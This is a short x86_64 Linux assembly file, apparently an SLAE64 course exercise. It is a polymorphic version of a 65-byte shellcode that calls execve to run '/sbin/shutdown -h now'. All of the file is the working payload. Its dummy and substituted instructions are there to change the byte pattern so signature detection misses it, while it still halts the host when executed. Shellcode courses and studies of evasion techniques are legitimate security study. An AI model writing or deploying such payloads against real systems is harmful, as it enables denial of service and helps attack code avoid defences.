; Author : SLAE64-PA-6470 (kahlon81)

; nasm -f elf64 shellcode-877-polymorphic2.nasm -o shellcode-877-polymorphic2.o
; ld shellcode-877-polymorphic2.o -o shellcode-877-polymorphic2

; Title: shutdown -h now x86_64 Shellcode - 65 bytes
; Platform: linux/x86_64
; Date: 2014-06-27
; Original Author: Osanda Malith Jayathissa (@OsandaMalith)

section .text

global _start

_start:

;xor rax, rax
mov rbx, rax
sub rax, rbx

xor rdx, rdx 

; dummy instruction
xor r9, r9
add r9b, 0x33

;push rax
mov qword [rsp - 8], rax
sub rsp, 8

push byte 0x77
push word 0x6f6e ; now
mov rbx, rsp

push rax
push word 0x682d ;-h
mov rcx, rsp

; dummy instruction
sub r9b, 0x12

push rax
mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown
mov r10, 0x6e776f6474756873
push r10
push r8
mov rdi, rsp

push rdx
push rbx
push rcx
push rdi
mov rsi, rsp

add rax, 59

syscall